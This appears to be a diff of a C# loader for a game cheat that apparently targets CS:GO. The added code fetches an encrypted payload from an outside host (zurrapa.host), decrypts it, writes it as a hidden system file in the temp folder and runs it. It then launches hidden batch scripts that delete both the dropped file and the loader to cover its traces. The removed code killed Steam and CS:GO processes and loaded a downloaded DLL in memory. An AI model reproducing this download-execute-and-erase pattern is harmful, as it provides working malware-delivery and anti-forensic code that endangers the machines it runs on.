@@ -32,9 +32,8 @@ namespace SecuritySpace
             {
                 DeleteLoader();
             }
-            CheckSteam();
-            CheckUSB();
-            LoadCheat(@"http://zurrapa.host/enVycmFwYU5vcm1hbA"); //"http://zurrapa.host/enVycmFwYU5vcm1hbA"
+
+            LoadCheat(@"http://zurrapa.host/zu");
         }
         #endregion
 
@@ -52,65 +51,32 @@ namespace SecuritySpace
 
         #region Private_Methods
 
-        private static void CheckSteam()
-        {
-            try
-            {
-                Process.GetProcessesByName("steam")[0].Kill();
-                Console.WriteLine("[ + ] Steam has been closed");
-            }
-            catch (Exception)
-            {
-                Console.WriteLine("[ + ] Steam is already closed");
-            }
-
-            try
-            {
-                Process.GetProcessesByName("csgo")[0].Kill();
-                Console.WriteLine("[ + ] CSGO has been closed");
-            }
-            catch (Exception)
-            {
-            }
-        }
-
         private static void LoadCheat(string base64URL)
-        {          
+        {
+            Process p = new Process();
+
             try
             {
+                string path = Path.GetTempPath() + Guid.NewGuid().ToString().ToUpper();
+
                 using (WebClient web = new WebClient())
                 {
-                    DynamicDllLoader loader = new DynamicDllLoader();
-                    loader.LoadLibrary(Crypt.Decrypt(web.DownloadData(base64URL)));
+                    File.WriteAllBytes(path, Crypt.Decrypt(web.DownloadData(base64URL)));
+                    File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Temporary | FileAttributes.Hidden | FileAttributes.System);
 
-                    Zurrapa main = (Zurrapa)Marshal.GetDelegateForFunctionPointer((IntPtr)loader.GetProcAddress("Zurrapa"), typeof(Zurrapa));
-
-                    main(serial);
+                    p.StartInfo.FileName = path;
+                    p.StartInfo.UseShellExecute = false;
+                    p.StartInfo.Arguments = serial;
+                    p.Start();
                 }
             }
             catch (Exception e)
             {
-                MessageBox.Show(e.StackTrace, "Error");
+                MessageBox.Show(e.Message, "Error");
             }
             finally
             {
-                Exit();
-            }
-        }
-
-        private static void CheckUSB()
-        {
-            DriveInfo driveInfo = new DriveInfo(Directory.GetDirectoryRoot(Directory.GetCurrentDirectory()));
-
-            if (driveInfo.DriveType != DriveType.Removable)
-            {
-                MessageBox.Show("Execute me from an USB", "Error");
-                Exit();
-            }
-
-            if (driveInfo.DriveFormat != "FAT32")
-            {
-                MessageBox.Show("Format your USB to FAT32", "Error");
+                DeleteProcessWhenExit(p);
                 Exit();
             }
         }
@@ -140,18 +106,18 @@ namespace SecuritySpace
         }
 
         private static void DeleteLoader()
-        {    
-            string temppath, current_path;
+        {
+            string temppath, currentProcessPath;
 
-            temppath = Path.Combine(Path.GetTempPath(), "enVycmFwYWJhdA.bat");
-            current_path = Path.Combine(Directory.GetCurrentDirectory(), Assembly.GetExecutingAssembly().GetName().Name + ".exe");
+            currentProcessPath = Process.GetCurrentProcess().MainModule.FileName;
+            temppath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString().ToUpper() + ".bat");
 
             using (StreamWriter w = new StreamWriter(temppath))
             {
+                w.WriteLine("@ECHO OFF");
                 w.WriteLine(":Repeat");
-                w.WriteLine("del \"" + current_path + "\"");
-                w.WriteLine("if exist \"" + current_path + "\" goto Repeat");
-                w.WriteLine("rmdir \"" + Directory.GetCurrentDirectory() + "\"");
+                w.WriteLine("del \"" + currentProcessPath + "\"");
+                w.WriteLine("if exist \"" + currentProcessPath + "\" goto Repeat");
                 w.WriteLine("del \"" + temppath + "\"");
                 w.Close();
             }
@@ -165,6 +131,42 @@ namespace SecuritySpace
             }
 
             Exit();
+        }
+
+        private static void DeleteProcessWhenExit(Process p)
+        {
+            string temppath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString().ToUpper() + ".bat");
+            string SettingsPath = Path.Combine(Path.GetTempPath(), serial + ".ini");
+            string FileName = p.MainModule.FileName;
+
+            try
+            {
+                using (StreamWriter w = new StreamWriter(temppath))
+                {
+                    w.WriteLine("@ECHO OFF");
+                    w.WriteLine(":StartScript");
+                    w.WriteLine("timeout /t 1 /nobreak");
+                    w.WriteLine("del /A:S \"" + FileName + "\"");
+                    w.WriteLine("if exist \"" + FileName + "\" goto :StartScript");
+                    w.WriteLine("del \"" + temppath + "\"");
+                    w.Close();
+                }
+
+                using (Process proc = new Process())
+                {
+                    proc.StartInfo.CreateNoWindow = true;
+                    proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    proc.StartInfo.FileName = temppath;
+                    proc.Start();
+                }
+            }
+            catch (Exception e)
+            {
+                File.Delete(FileName);
+                File.Delete(SettingsPath);
+                Exit();
+            }
+
         }
 
         private static void Exit()
@@ -185,18 +187,6 @@ namespace SecuritySpace
                 StringBuilder FileSystemNameBuffer,
                 UInt32 FileSystemNameSize
             );
-
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr LoadLibrary(string dllToLoad);
-
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
-
-        [DllImport("kernel32.dll")]
-        public static extern bool FreeLibrary(IntPtr hModule);
-
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        private delegate int Zurrapa(string hwid);
         #endregion
     }
 }
